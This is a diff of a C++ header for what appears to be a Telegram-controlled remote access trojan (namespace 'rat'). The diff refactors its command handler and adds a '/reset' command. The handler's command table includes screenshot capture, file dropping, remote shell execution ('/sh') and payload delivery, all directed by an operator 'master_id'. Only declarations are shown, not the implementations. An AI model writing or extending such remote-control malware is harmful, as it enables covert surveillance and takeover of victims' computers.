@@ -6,31 +6,39 @@
 #include "rat/tbot/types.hpp"
 #include "rat/networking.hpp"
 
+#include <memory>
 #include <string>
 #include <array>
 #include <vector>
 #include <cstdint>
 #include <mutex>
 
+
 namespace rat::handler {
 
+using ThreadPool_uPtr = std::unique_ptr<::rat::ThreadPool>;
+using BaseBot_uPtr = std::unique_ptr<::rat::tbot::BaseBot>;
+using Bot_uPtr = std::unique_ptr<::rat::tbot::Bot>;
+using CurlClient_uPtr = std::unique_ptr<::rat::networking::Client>;
+
 class Handler {
+public:
+    uint64_t master_id;
+    Bot_uPtr bot;
+    BaseBot_uPtr backing_bot;
+    CurlClient_uPtr curl_client;
+
 private:
-
     //the handler refrences the bot instead of owning it, they bot live inside the scope of the void botLoop(void) functions;
-    ::rat::tbot::Bot& bot;
-    ::rat::tbot::BaseBot& backing_bot;
-    ::rat::networking::Client curl_client;
-
-
-    ::rat::ThreadPool networking_pool;
-    ::rat::ThreadPool process_pool;
-    ::rat::ThreadPool timer_pool;
-
+    ThreadPool_uPtr networking_pool;
+    ThreadPool_uPtr process_pool;
+    ThreadPool_uPtr timer_pool;
+    
+    
     std::mutex curl_client_mutex; 
     std::mutex backing_bot_mutex;
 
-    ::rat::handler::RatState state;
+    std::unique_ptr<::rat::handler::RatState> state;
     /*since now we have a backing bot we can use its curl_client*/ 
 
     ::rat::tbot::Update telegram_update;
@@ -41,7 +49,8 @@ private:
         void (Handler::*handler)();
     };
     
-    const std::array<CommandHandler, 19> command_map = {{
+    const std::array<CommandHandler, 20> command_map = {{
+        {"/reset",        &Handler::handleResetCommand},
         {"/screenshot",   &Handler::handleScreenshotCommand},
         {"/drop",         &Handler::handleDropCommand},
         {"/sh",           &Handler::parseAndHandleShellCommand},
@@ -68,6 +77,7 @@ private:
     void parseTelegramMessageToCommand(void);
     
   // Command handler methods
+    void handleResetCommand();
     void handleScreenshotCommand();
     void handleDropCommand();
     void parseAndHandleShellCommand();
@@ -97,19 +107,17 @@ private:
     void handlePayloadCommand(void);
     
 public:
-    Handler(rat::tbot::Bot& arg_Bot, rat::tbot::BaseBot& Backing_Bot):
-        bot(arg_Bot),
-        backing_bot(Backing_Bot),
-        curl_client(3),
-        networking_pool(1),
-        process_pool(1),
-        timer_pool(1),
-        state(),
-        telegram_update(),
-        command()
-        {
-            this->bot.sendMessage("Handler has been istantiated");
-        } 
+    explicit Handler() {
+        this->state = std::make_unique<::rat::handler::RatState>();
+        this->telegram_update = {};
+        this->command = {};
+    };
+    void setMasterId(uint64_t Master_Id);
+    void initMainBot(const char* arg_Token);
+    void initBackingBot(const char* arg_Token);
+    void initCurlClient(uint8_t Operation_Restart_Bound = 5);
+    void initThreadPools(uint8_t Number_Networking_Threads = 1, uint8_t Number_Process_Threads = 1, uint8_t Number_Timer_Threads = 2);
+    
     // Handle Telegram update
     void handleUpdate(rat::tbot::Update&& arg_Update);
      
